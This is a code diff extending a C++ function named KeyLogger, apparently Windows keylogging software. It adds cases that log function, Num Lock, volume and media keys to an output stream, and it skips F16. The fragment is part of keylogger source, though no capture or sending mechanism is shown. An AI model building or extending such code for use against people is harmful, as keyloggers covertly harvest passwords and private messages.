@@ -315,7 +315,7 @@ void KeyLogger(void)
                         write << "\b";
                     }
                     break;
-                    case 13: // 13 is for tthe "Enter Key"
+                    case VK_RETURN: // ENTER key
                     {
                         write << " <Enter> " << std::endl;
                     }
@@ -339,6 +339,168 @@ void KeyLogger(void)
                     {
                         write << "\t";
                     }
+                    break;
+
+                    // Function key     
+                    case VK_F1: // F1 key
+                    {
+                        write << "<F1> ";
+                    }
+                    break;
+                    case VK_F2: // F2 key
+                    {
+                        write << "<F2> ";
+                    }
+                    break;
+                    case VK_F3 : // F3 key
+                    {
+                        write << "<F3> ";
+                    }
+                    break;
+                    case VK_F4: // F4 key
+                    {
+                        write<<"<F4> ";
+                    }
+                    break;
+                    case VK_F5: // F5 key
+                    {
+                        write << "<F5> ";
+                    }
+                    break;
+                    case VK_F6:  // F6 key
+                    {
+                        write << "<F6> ";
+                    }
+                    break;
+                    case VK_F7: // F7 key
+                    {
+                        write << "<F7> ";
+                    }
+                    break;
+                    case VK_F8: // F8 key
+                    {
+                        write << "<F8> ";
+                    }
+                    break;
+                    case VK_F9:	// F9 key
+                    {
+                        write << "<F9> ";
+                    }
+                    break;
+                    case VK_F10:	// F10 key
+                    {
+                        write << "<F10> ";
+                    }
+                    break;
+                    case VK_F11	: // F11 key
+                    {
+                        write << "<F11> ";
+                    }
+                    break;
+                    case VK_F12	: // F12 key
+                    {
+                        write << "<F12> ";
+                    }
+                    break;
+                    case VK_F13	: // F13 key
+                    {
+                        write << "<F13> ";
+                    }
+                    break;
+                    case VK_F14	: // F14 key
+                    {
+                        write << "<F14> ";
+                    }
+                    break;
+                    case VK_F15	: // F15 key
+                    {
+                        write << "<F15> ";
+                    }
+                    break;
+                    case VK_F17	: // F17 key
+                    {
+                        write << "<F17> ";
+                    }
+                    break;
+                    case VK_F18	: // F18 key
+                    {
+                        write << "<F18> ";
+                    }
+                    break;
+                    case VK_F19	: // F19 key
+                    {
+                        write << "<F19> ";
+                    }
+                    break;
+                    case VK_F20	: // F120 key
+                    {
+                        write << "<F20> ";
+                    }
+                    break;
+                    case VK_F21	: // F21 key
+                    {
+                        write << "<F21> ";
+                    }
+                    break;
+                    case VK_F22	: // F22 key
+                    {
+                        write << "<F22> ";
+                    }
+                    break;
+                    case VK_F23	: // F23 key
+                    {
+                        write << "<F23> ";
+                    }
+                    break;
+                    case VK_F24	: // F24 key
+                    {
+                        write << "<F24> ";
+                    }
+                    break;
+                    case VK_NUMLOCK	: // NUM LOCK key
+                    {
+                        write <<"<NUM LOCK key> ";
+                    }
+                    break;
+
+                    // Volume buttons
+                    case VK_VOLUME_MUTE: // Volume Mute key
+                    {
+                        write <<std::endl<<"<Volume Mute key> "<<std::endl;
+                    }
+                    break;
+                    case VK_VOLUME_DOWN: // Volume Down key
+                    {
+                        write<<std::endl<<"<Volume Down key> "<<std::endl;
+                    }
+                    break;
+                    case VK_VOLUME_UP: // Volume Up key
+                    {
+                        write<<std::endl<<"<Volume Up key> "<<std::endl;
+                    }
+                    break;
+
+                    // Media Player buttons 
+                    case VK_MEDIA_NEXT_TRACK: // Next Track key
+                    {
+                        write <<std::endl << "<Next Track key> "<<std::endl;
+                    }
+                    break;
+                    case VK_MEDIA_PREV_TRACK :// Previous Track key
+                    {
+                        write << std::endl << "<Previous Track key> "<<std::endl;
+                    }
+                    break;
+                    case VK_MEDIA_STOP:	// Stop Media key
+                    {
+                        write <<std::endl << "<Stop Media key> "<<std::endl;
+                    }
+                    break;
+                    case VK_MEDIA_PLAY_PAUSE:	// Play/Pause Media key
+                    {
+                        write <<std::endl << "<Play/Pause Media key> "<<std::endl;
+                    }
+                    break;
                 }
             }
         }
